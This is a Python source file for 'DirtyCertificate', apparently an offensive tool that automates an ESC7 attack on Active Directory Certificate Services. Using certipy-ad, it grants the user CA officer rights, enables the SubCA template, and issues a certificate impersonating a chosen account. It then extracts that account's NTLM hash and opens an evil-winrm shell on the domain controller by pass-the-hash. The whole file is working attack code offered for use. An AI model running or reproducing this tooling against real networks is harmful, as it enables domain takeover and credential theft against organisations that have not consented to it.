import rich
from rich.console import Console
from rich.progress import track
import subprocess
import argparse
import re
import os
import time

console = Console()

def print_step(text):
    console.print(text, style="bold green")

def print_verbose(text):
    console.print(text)  

def print_error(text):
    console.print(text, style="bold red")

#Just to make you wait :) 
# No kidding, it helps with sync and all the stuff behind
def start_loading(text):
    with console.status(text) as status:
        for _ in track(range(25)):
            time.sleep(0.1)
    

def extract_request_id(output):
    print_verbose(output)
    match = re.search(r'Request ID is (\d+)', output)
    if match:
        return match.group(1)
    return None

def create_officer(args):
    print_step("[*] Trying to get CA manager role")
    command = f"/usr/bin/certipy-ad ca -ca '{args.ca}' -add-officer {args.username} -username {args.username}@{args.domain} -password '{args.password}' -target {args.dc_ip}"
    output = subprocess.run(command, shell=True, capture_output=True, text=True)

    if output.returncode == 127:
        print_error("Command certipy-ad not found. Install it with 'pip install certipy'")

    match = re.search(r'Successfully|already has officer rights', str(output))

    if args.verbose:
        print_verbose(output.stdout)  
    
    if match:
        print_step("[*] Succesful !")
    else:
        print_error("[*] Unsuccesful to get CA manager role, exiting...")
        exit(1)

def enable_template(args):
    print_step("[*] Trying to enable SubCA template (vulnerable to ESC7)")
    start_loading("Working...")
    command = f"/usr/bin/certipy-ad ca -ca '{args.ca}' -enable-template SubCA -username {args.username}@{args.domain} -password '{args.password}'"
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    match = re.search(r'Successfully enabled', str(output))

    if args.verbose:
        print_verbose(output.stdout)
    if match:
        print_step("[*] Succesful ! If  CERTSRV_E_TEMPLATE_DENIED below, there is no problem, it'll work anyway")
    else:
        print_error("[*] Unsuccesful to enable SubCA template, exiting...")
        exit(1)
        
def request_certificate(args):
    command = f"/usr/bin/echo N | /usr/bin/certipy-ad req -username '{args.username}@{args.domain}' -password '{args.password}' -ca {args.ca} -target {args.domain} -template SubCA -upn {args.impersonate}@{args.domain}"

    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    request_id = extract_request_id(output.stdout)
    print_step("[*] Request succesful, request id is " + request_id)

    if args.verbose:
        print_verbose(output.stdout)

    return request_id

def issue_certificate(args, request_id):
    print_step("[*] Issuing certificate")
    start_loading("Working...")
    command = f"/usr/bin/certipy-ad ca -ca '{args.ca}' -issue-request {request_id} -username {args.username}@{args.domain} -password '{args.password}'"
    output = subprocess.run(command, shell=True, capture_output=True, text=True)

    if args.verbose:
        print_verbose(output.stdout)

def retrieve_certificate(args, request_id):
    print_step("[*] Retrieving and downloading certificate")
    start_loading("Working...")
    command = f"/usr/bin/certipy-ad req -username {args.username}@{args.domain} -password '{args.password}' -ca {args.ca} -target {args.domain} -retrieve {request_id}"
    output = subprocess.run(command, shell=True, capture_output=True, text=True)

    if args.verbose:
        print_verbose(output.stdout)


def sync_time():
    print_step("[*] Sync time to ask TGT (sudo password used)")
    start_loading("Working...")
    command = f"sudo /usr/sbin/ntpdate {args.domain}" 
    output = subprocess.run(command, shell=True, capture_output=True, text=True)

    if args.verbose:
        print_verbose(output.stdout)

def authenticate_with_pfx(args):
    print_step(f"[*] Asking TGT and hash of {args.impersonate}")
    start_loading("Working...")    
    command = f"/usr/bin/certipy-ad auth -pfx ./{args.impersonate}.pfx -dc-ip '{args.dc_ip}' -username {args.impersonate} -domain '{args.domain}'"
    output = subprocess.run(command, shell=True, capture_output=True, text=True)

    if args.verbose:
        print_verbose(output.stdout)
    
    spawn_evilwinrm(args,output)
    

def spawn_evilwinrm(args,output):
    print_step(f"[*] Connecting to DC using {args.impersonate} hash")
    hash_regex = r"^.*: ([a-fA-F0-9]+):([a-fA-F0-9]+)$"
    match = re.search(hash_regex, output.stdout, re.MULTILINE)
    if match:
        command = f"/usr/bin/evil-winrm -i {args.dc_ip} -u {args.impersonate}@{args.domain} -H {match.group(2)}"

        os.system(command)
    return None
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DirtyCertificate, a tool to exploit ESC7 and ESC1")
    parser.add_argument("-ca", type=str, help="Certification Authority name")
    parser.add_argument("-username", type=str, help="Username used to bind") 
    parser.add_argument("-password", type=str, help="Password of the username used to bind")
    parser.add_argument("-dc_ip", type=str, help="IP of the domain controller")
    parser.add_argument("-domain", type=str, help="Domain name")
    parser.add_argument("-impersonate", type=str, help="Account to impersonate")
    parser.add_argument('-v', '--verbose', action='store_true', help='Activate verbose mode')

    args = parser.parse_args()
    create_officer(args)
    enable_template(args)
    request_id = request_certificate(args)
    if request_id:
        issue_certificate(args, request_id)
        retrieve_certificate(args, request_id)
        sync_time()
        authenticate_with_pfx(args)
    else:
        print_error("Échec de la récupération de l'ID de requête. Veuillez vérifier la sortie de la commande de demande de certificat.")